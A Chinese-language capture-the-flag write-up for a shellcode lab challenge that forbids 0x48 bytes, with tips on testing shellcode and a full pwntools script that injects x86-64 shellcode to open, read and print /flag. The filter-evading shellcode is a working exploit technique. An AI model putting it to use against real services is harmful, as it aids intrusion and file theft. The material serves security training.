# 挑战简介
```
编写并执行shellcode来读取标志，但是您输入的数据在执行之前会被过滤。
这个挑战要求你的 shellcode 没有 H 字节！
```

# 思路
这题真的阴，你在注入shellcode的时候一定要充分了解它是x86模式的处理还是x64的处理  
对于本题的程序而言，是x86的编写，但是又要求你的shellcode不能有'H'(说明你不能用64位寄存器，因此整体你要用32位的编写模式：在64位的框架下)-很抽象  
你盲测是很难看出你的shellcode执行效果的，所以你要学会自己测自己的shellcode，涉及三个指令
```
as -o shellcode.o shellcode.s      #其中shellcode.s文件由你的汇编代码组成
# as的作用是将.s的汇编源文件转化为.o目标文件
ld -o shellcode-elf shellcode.o
# 利用ld可以将目标文件转换成-elf可执行文件
strace ./shellcode-elf
# strace实际上是使用Linux内核提供的ptrace系统调用来实现其功能。ptrace允许一个进程（跟踪者）观察和控制另一个进程（被跟踪者）的执行，并检查和修改被跟踪进程的内存和寄存器。
```
明白了这些，将你要注入的代码写入shellcode.s文件，进行自测，自己测的没问题了，基本挑战也没问题  
**但要注意的还是不要用类似"mov rax, rbx"这种64位寄存器，因为会出现48(H)**

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-4')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

shellcode = asm('''
    /* 清零寄存器 */
    xor eax, eax
    
    /* 在栈上构建 "/flag" 字符串 - 完全避免所有会生成 0x48 的指令 */
    push rax               /* 压入 null 终止符 '\0' */
    
    /* 预先准备好一个字符串的初始值 */
    mov edi, 0x00000000
    push rdi
    
    /* 逐字节写入字符，避免任何会生成 0x48 的指令 */
    mov byte ptr [rsp], '/'
    mov byte ptr [rsp+1], 'f'
    mov byte ptr [rsp+2], 'l'
    mov byte ptr [rsp+3], 'a'
    mov byte ptr [rsp+4], 'g'
    mov byte ptr [rsp+5], 0     /* 确保 null 终止 */
    
    /* 系统调用 open (2) */
    mov al, 2                   /* 系统调用号为 open() */
    
    /* 避免使用 mov rdi, rsp (会生成 48 89 e7) */
    /* 替代方案：使用 lea edi, [rsp] 然后扩展 */
    lea edi, [rsp]              /* 32位地址加载，不会生成 0x48 */
    push rsp                    /* 将 rsp 压栈 */
    pop rdi                     /* 然后弹出到 rdi，这个序列不会生成 0x48 */
    
    xor esi, esi               /* 第二个参数：O_RDONLY 标志 (0) */
    syscall                    /* 执行系统调用 */
    
    /* 检查 open 是否成功 */
    cmp eax, 0
    jl exit                    /* 如果返回负值，跳到exit */
    
    /* 保存文件描述符并进行 read 系统调用 */
    mov edi, eax               /* 第一个参数：文件描述符 */
    xor eax, eax               /* 系统调用号为 read() */
    
    /* 为缓冲区创建空间，避免 sub rsp, 100 (会生成 0x48) */
    push rsp
    pop rsi                    /* rsi = rsp */
    push 0x40                  /* 栈上分配 64 字节 */
    push 0x40                  /* 再分配 64 字节 */
    push rsi                   /* 保存原始 rsp 的值 */
    push rsp
    pop rsi                    /* rsi 现在指向缓冲区 */
    
    /* 设置读取大小 */
    mov edx, 100               /* 读取 100 字节 */
    syscall                    /* 执行 read 系统调用 */
    
    /* 检查 read 是否成功 */
    cmp eax, 0
    jle exit                   /* 如果小于等于0，跳到exit */
    
    /* 保存读取的字节数 */
    mov edx, eax               /* 保存读取的字节数 */
    
    /* 系统调用 write (1) */
    mov eax, 1                 /* 系统调用号为 write() */
    mov edi, 1                 /* 第一个参数：标准输出 (fd=1) */
    /* rsi 已经指向缓冲区 */
    syscall                    /* 执行系统调用 */
    
exit:
    /* 系统调用 exit (60) */
    mov eax, 60                /* 系统调用号为 exit() */
    xor edi, edi               /* 第一个参数：退出状态 0 */
    syscall                    /* 执行系统调用 */
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
